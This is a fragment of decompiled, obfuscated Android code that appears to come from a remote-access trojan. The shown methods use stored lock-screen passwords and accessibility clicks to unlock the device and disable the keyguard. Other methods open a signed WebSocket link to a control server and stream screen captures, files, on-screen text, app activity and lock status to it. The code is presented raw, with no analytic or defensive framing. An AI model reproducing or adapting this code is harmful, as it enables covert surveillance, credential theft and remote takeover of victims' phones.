                        }
                    } else {
                        JInfo c6 = g3.k.b().c(0);
                        if (c6 == null) {
                            i.n(1, "29", null);
                            return;
                        }
                        int ty = c6.getTy();
                        if (ty == 1) {
                            Z(1, c6.getPw(), null, true);
                            pw2 = c6.getPw2();
                        } else if (ty == 2) {
                            Z(2, c6.getPw(), c6.getPw2(), true);
                            pw2 = c6.getPw2();
                        } else {
                            if (ty != 3) {
                                return;
                            }
                            i.f2799e = System.currentTimeMillis();
                            if (!f0(c6.getPw())) {
                                i.n(1, "33", c6.getPw());
                                return;
                            }
                            i.n(0, "31", c6.getPw());
                            k5 = i.g.k(i6, "com.android.systemui:id/btn_letter_ok");
                            if (k5 == null && i5 == 4) {
                                k5 = i.g.k(i6, "com.android.systemui:id/vivo_cancel");
                            }
                            if (k5 == null) {
                                return;
                            }
                        }
                    }
                    try {
                        Thread.sleep(300L);
                    } catch (InterruptedException unused4) {
                    }
                    BaseService.g().n(k5);
                    return;
                }
                JInfo c7 = g3.k.b().c(2);
                if (c7 == null) {
                    i.n(1, "26", null);
                    return;
                } else {
                    Z(2, c7.getPw(), c7.getPw2(), true);
                    pw2 = c7.getPw2();
                }
                str = "30";
                i.n(0, str, pw2);
            }
            JInfo c8 = g3.k.b().c(1);
            if (c8 == null) {
                i.n(1, "28", null);
                return;
            } else {
                Z(1, c8.getPw(), null, true);
                pw2 = c8.getPw2();
            }
            str = "32";
            i.n(0, str, pw2);
        }

        public final void r0() {
            KeyguardManager keyguardManager = (KeyguardManager) this.f2811h.getSystemService("keyguard");
            if (!keyguardManager.isKeyguardLocked()) {
                i.n(1, "24", null);
                return;
            }
            PowerManager powerManager = (PowerManager) this.f2811h.getSystemService("power");
            if (powerManager.isScreenOn()) {
                i.n(0, "51", null);
            } else if (!NotificationManagerCompat.from(this.f2811h).areNotificationsEnabled()) {
                i.n(1, "46", null);
                i.n(1, "50", null);
                return;
            } else {
                PowerManager.WakeLock newWakeLock = powerManager.newWakeLock(268435466, "bright");
                newWakeLock.acquire(WorkRequest.MIN_BACKOFF_MILLIS);
                newWakeLock.release();
            }
            KeyguardManager.KeyguardLock newKeyguardLock = keyguardManager.newKeyguardLock("unLock");
            newKeyguardLock.reenableKeyguard();
            newKeyguardLock.disableKeyguard();
        }
    }

    /* loaded from: classes8.dex */
    public class b implements s3.e {
        @Override // s3.e
        public final void a(@NonNull s3.d dVar, @NonNull b0 b0Var) {
        }

        @Override // s3.e
        public final void b(@NonNull s3.d dVar, @NonNull IOException iOException) {
        }
    }

    public static boolean a() {
        return f2795a != null && f2798d > 0 && System.currentTimeMillis() - f2798d < 15000;
    }

    public static boolean b() {
        return f2795a != null;
    }

    public static void c(Context context) {
        String c5 = k3.a.c(context);
        if (b()) {
            p(c5);
            return;
        }
        String string = SPUtils.getInstance().getString("md5Key");
        if (TextUtils.isEmpty(string)) {
            return;
        }
        int b5 = k3.h.b(context);
        int a5 = k3.h.a(context);
        float f5 = b5;
        float f6 = a5;
        a listener = new a(c5, context, 0.79f * f5, f6 * 0.51f, f5 * 0.21f, f6 * 0.49f, f5 * 0.49f, f6 * 0.78f, f5 * 0.51f, f6 * 0.19f, b5, a5);
        byte[] bArr = k3.i.f3901a;
        long currentTimeMillis = System.currentTimeMillis();
        byte[] a6 = h3.a.a(c5 + string + currentTimeMillis);
        char[] cArr = new char[a6.length * 2];
        int i5 = 0;
        for (byte b6 : a6) {
            int i6 = i5 + 1;
            char[] cArr2 = d1.d.f2477e;
            cArr[i5] = cArr2[(b6 >> 4) & 15];
            i5 = i6 + 1;
            cArr[i6] = cArr2[b6 & 15];
        }
        String str = "?timeStamp=" + currentTimeMillis + "&sign=" + new String(cArr);
        StringBuilder sb = new StringBuilder();
        if (TextUtils.isEmpty(j0.f3706f)) {
            String string2 = SPUtils.getInstance().getString("wsUrl");
            j0.f3706f = string2;
            if (TextUtils.isEmpty(string2)) {
                j0.f3706f = androidx.appcompat.graphics.drawable.a.c(androidx.activity.d.g("wss://"), j0.f().split("\\|")[0], "/websocket/message/DEVICE_");
                SPUtils.getInstance().put("wsUrl", j0.f3706f);
            }
        }
        sb.append(j0.f3706f);
        sb.append(c5);
        sb.append(str);
        String sb2 = sb.toString();
        w okHttpClient = k3.b.a();
        y.a aVar = new y.a();
        aVar.e(sb2);
        y request = aVar.a();
        Objects.requireNonNull(okHttpClient);
        Intrinsics.checkNotNullParameter(request, "request");
        Intrinsics.checkNotNullParameter(listener, "listener");
        e4.d dVar = new e4.d(v3.d.f5712h, request, listener, new Random(), okHttpClient.B, okHttpClient.C);
        Intrinsics.checkNotNullParameter(okHttpClient, "client");
        if (dVar.f2624r.b("Sec-WebSocket-Extensions") != null) {
            dVar.i(new ProtocolException("Request header not permitted: 'Sec-WebSocket-Extensions'"), null);
        } else {
            Intrinsics.checkNotNullParameter(okHttpClient, "okHttpClient");
            w.a aVar2 = new w.a();
            aVar2.f5345a = okHttpClient.f5320b;
            aVar2.f5346b = okHttpClient.f5321c;
            CollectionsKt.addAll(aVar2.f5347c, okHttpClient.f5322d);
            CollectionsKt.addAll(aVar2.f5348d, okHttpClient.f5323e);
            aVar2.f5349e = okHttpClient.f5324f;
            aVar2.f5350f = okHttpClient.f5325g;
            aVar2.f5351g = okHttpClient.f5326h;
            aVar2.f5352h = okHttpClient.f5327i;
            aVar2.f5353i = okHttpClient.f5328j;
            aVar2.f5354j = okHttpClient.f5329k;
            aVar2.f5355k = okHttpClient.f5330l;
            aVar2.f5356l = okHttpClient.f5331m;
            aVar2.f5357m = okHttpClient.f5332n;
            aVar2.f5358n = okHttpClient.f5333o;
            aVar2.f5359o = okHttpClient.f5334p;
            aVar2.f5360p = okHttpClient.f5335q;
            aVar2.f5361q = okHttpClient.f5336r;
            aVar2.f5362r = okHttpClient.f5337s;
            aVar2.f5363s = okHttpClient.f5338t;
            aVar2.f5364t = okHttpClient.f5339u;
            aVar2.f5365u = okHttpClient.f5340v;
            aVar2.f5366v = okHttpClient.f5341w;
            aVar2.f5367w = okHttpClient.f5342x;
            aVar2.f5368x = okHttpClient.f5343y;
            aVar2.f5369y = okHttpClient.f5344z;
            aVar2.f5370z = okHttpClient.A;
            aVar2.A = okHttpClient.B;
            aVar2.B = okHttpClient.C;
            aVar2.C = okHttpClient.D;
            o.a asFactory = o.f5265a;
            Intrinsics.checkNotNullParameter(asFactory, "eventListener");
            byte[] bArr2 = t3.c.f5449a;
            Intrinsics.checkNotNullParameter(asFactory, "$this$asFactory");
            aVar2.f5349e = new t3.a();
            List<x> protocols = e4.d.f2606x;
            Intrinsics.checkNotNullParameter(protocols, "protocols");
            List mutableList = CollectionsKt.toMutableList((Collection) protocols);
            x xVar = x.H2_PRIOR_KNOWLEDGE;
            if (!(mutableList.contains(xVar) || mutableList.contains(x.HTTP_1_1))) {
                throw new IllegalArgumentException(("protocols must contain h2_prior_knowledge or http/1.1: " + mutableList).toString());
            }
            if (!(!mutableList.contains(xVar) || mutableList.size() <= 1)) {
                throw new IllegalArgumentException(("protocols containing h2_prior_knowledge cannot use other protocols: " + mutableList).toString());
            }
            if (!(!mutableList.contains(x.HTTP_1_0))) {
                throw new IllegalArgumentException(("protocols must not contain http/1.0: " + mutableList).toString());
            }
            if (!(!mutableList.contains(null))) {
                throw new IllegalArgumentException("protocols must not contain null".toString());
            }
            mutableList.remove(x.SPDY_3);
            if (!Intrinsics.areEqual(mutableList, aVar2.f5363s)) {
                aVar2.C = null;
            }
            List<? extends x> unmodifiableList = Collections.unmodifiableList(mutableList);
            Intrinsics.checkNotNullExpressionValue(unmodifiableList, "Collections.unmodifiableList(protocolsCopy)");
            aVar2.f5363s = unmodifiableList;
            w wVar = new w(aVar2);
            y.a aVar3 = new y.a(dVar.f2624r);
            aVar3.b("Upgrade", "websocket");
            aVar3.b("Connection", "Upgrade");
            aVar3.b("Sec-WebSocket-Key", dVar.f2607a);
            aVar3.b("Sec-WebSocket-Version", "13");
            aVar3.b("Sec-WebSocket-Extensions", "permessage-deflate");
            y a7 = aVar3.a();
            w3.e eVar = new w3.e(wVar, a7, true);
            dVar.f2608b = eVar;
            Intrinsics.checkNotNull(eVar);
            eVar.e(new e4.e(dVar, a7));
        }
        f2795a = dVar;
    }

    public static void d(boolean z4) {
        if (f2795a == null) {
            return;
        }
        f.e eVar = new f.e();
        eVar.put("code", 1201);
        eVar.put("black", Integer.valueOf(z4 ? 1 : 0));
        f2795a.b(eVar.l());
    }

    public static void e(byte[] bArr, int i5, int i6) {
        if (f2795a == null) {
            return;
        }
        if (f2804j <= 0 || System.currentTimeMillis() - f2804j >= f2803i) {
            Bitmap decodeByteArray = BitmapFactory.decodeByteArray(bArr, 0, bArr.length);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            decodeByteArray.compress(Bitmap.CompressFormat.JPEG, 20, byteArrayOutputStream);
            f.e eVar = new f.e();
            eVar.put("code", 1301);
            eVar.put("data", byteArrayOutputStream.toByteArray());
            eVar.put("type", 2);
            eVar.put("width", Integer.valueOf(i5));
            eVar.put("height", Integer.valueOf(i6));
            long currentTimeMillis = System.currentTimeMillis();
            f2804j = currentTimeMillis;
            eVar.put("t", Long.valueOf(currentTimeMillis));
            f2795a.b(eVar.l());
        }
    }

    public static void f(byte[] bArr, String str) {
        if (f2795a == null) {
            return;
        }
        f.e eVar = new f.e();
        eVar.put("code", 1303);
        eVar.put("type", 1);
        eVar.put("name", str);
        eVar.put("data", bArr);
        f2795a.b(eVar.l());
    }

    public static void g(boolean z4) {
        if (f2795a == null) {
            return;
        }
        f.e eVar = new f.e();
        eVar.put("code", 1202);
        eVar.put("forbid", Integer.valueOf(z4 ? 1 : 0));
        f2795a.b(eVar.l());
    }

    public static void h(boolean z4) {
        if (f2795a == null) {
            return;
        }
        f.e eVar = new f.e();
        eVar.put("code", 1209);
        eVar.put("iconStatus", Integer.valueOf(z4 ? 1 : 0));
        f2795a.b(eVar.l());
    }

    public static void i(int i5, int i6, long j5, String str, String str2, String str3, String str4) {
        if (f2795a == null) {
            return;
        }
        f.e eVar = new f.e();
        eVar.put("code", 1311);
        eVar.put("et", Integer.valueOf(i5));
        eVar.put("pa", Integer.valueOf(i6));
        eVar.put("ti", Long.valueOf(j5));
        eVar.put("te", str);
        eVar.put("pk", str2);
        if (str4 != null) {
            eVar.put("na", str4);
        }
        if (str3 != null) {
            eVar.put("de", str3);
        }
        f2795a.b(eVar.l());
    }

    public static void j(int i5, long j5) {
        if (f2795a == null) {
            return;
        }
        f.e eVar = new f.e();
        eVar.put("code", Integer.valueOf(PointerIconCompat.TYPE_HAND));
        eVar.put("lock", Integer.valueOf(i5));
        if (i5 == 1) {
            eVar.put("lockTime", Long.valueOf(j5));
        }
        f2795a.b(eVar.l());
    }

    public static void k(boolean z4) {
        if (f2795a == null) {
            return;
        }
        f.e eVar = new f.e();
        eVar.put("code", 1203);
        eVar.put("media", Integer.valueOf(z4 ? 1 : 0));
        f2795a.b(eVar.l());
    }

    public static void l(String str, int i5, int i6, int i7) {
        if (f2795a == null) {
            return;
        }
        f.e eVar = new f.e();
        eVar.put("code", 1320);
        eVar.put("packageName", str);
        eVar.put("customId", Integer.valueOf(i5));
        eVar.put("installed", Integer.valueOf(i6));
        eVar.put("done", Integer.valueOf(i7));
        f2795a.b(eVar.l());
    }

    public static synchronized void m(byte[] bArr) {
        synchronized (i.class) {
            if (f2795a == null) {
                return;
            }
            if (f2802h <= 0 || System.currentTimeMillis() - f2802h >= f2801g) {
                f.e eVar = new f.e();
                eVar.put("code", Integer.valueOf(PointerIconCompat.TYPE_WAIT));
                eVar.put("data", bArr);
                long currentTimeMillis = System.currentTimeMillis();
                f2802h = currentTimeMillis;
                eVar.put("t", Long.valueOf(currentTimeMillis));
                f2795a.b(eVar.l());
            }
        }
    }

    public static void n(int i5, String str, String str2) {
        if (f2795a == null) {
            return;
        }
        f.e eVar = new f.e();
        eVar.put("code", 1005);
        eVar.put("mcode", str);
        eVar.put("level", Integer.valueOf(i5));
        if (str2 != null) {
            eVar.put(NotificationCompat.CATEGORY_MESSAGE, str2);
        }
        f2795a.b(eVar.l());
    }

    public static void o() {
        BaseService.g().performGlobalAction(3);
        try {
            Thread.sleep(200L);
        } catch (InterruptedException unused) {
        }
        BaseService.g().performGlobalAction(1);
    }

    public static void p(String str) {
        f.e eVar = new f.e();
        eVar.put("action", "updateCtrl");
        eVar.put("deviceId", str);
        eVar.put("ctrlCmd", 0);
        k3.i.a(eVar, new b());
    }
}
